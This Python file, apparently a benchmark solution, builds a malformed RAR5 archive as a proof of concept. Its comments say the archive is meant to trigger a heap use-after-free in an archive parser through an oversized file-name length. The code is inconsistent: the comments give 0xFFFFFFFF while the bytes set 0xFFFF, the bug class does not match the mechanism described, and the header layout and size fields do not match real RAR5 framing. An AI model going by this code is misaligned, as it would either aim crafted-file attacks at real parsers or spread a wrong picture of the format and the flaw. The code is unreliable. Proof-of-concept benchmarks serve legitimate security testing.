import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 header structure
        # We need to create a RAR5 archive with a file that has an extremely large name size
        # to trigger the heap use-after-free vulnerability
        
        # RAR5 signature
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Main archive header
        main_header = (
            b'\x01' +           # header type: 0x01 = main archive header
            b'\x00\x00' +       # flags: 0x0000
            b'\x13\x00' +       # header size: 19 bytes
            b'\x00' * 13        # reserved
        )
        
        # File header with maliciously large name size
        # The vulnerability: name size is read before validation
        # We'll set name_size to 0xFFFFFFFF to cause excessive allocation
        
        # Calculate total header size
        # Base header: 1 + 2 + 2 + 8 + 4 + 4 = 21 bytes
        # Name field: 2 + 4 = 6 bytes (name_size + actual name)
        total_header_size = 21 + 6
        
        file_header = (
            b'\x05' +                       # header type: 0x05 = file header
            b'\x00\x00' +                   # flags: 0x0000 (no extra fields)
            struct.pack('<H', total_header_size) +  # header size
            b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # uncompressed size = 0
            b'\x00\x00\x00\x00' +           # modification time
            b'\x00\x00\x00\x00' +           # file attributes
            b'\xff\xff' +                   # name_size = 0xFFFF (triggers large allocation)
            b'poc' + b'\x00'                # actual name (3 bytes + null terminator)
        )
        
        # End of archive block
        end_of_archive = (
            b'\x03' +           # header type: 0x03 = end of archive
            b'\x00\x00' +       # flags: 0x0000
            b'\x07\x00' +       # header size: 7 bytes
            b'\x00'             # checksum (ignored)
        )
        
        # Combine all parts
        poc = signature + main_header + file_header + end_of_archive
        
        return poc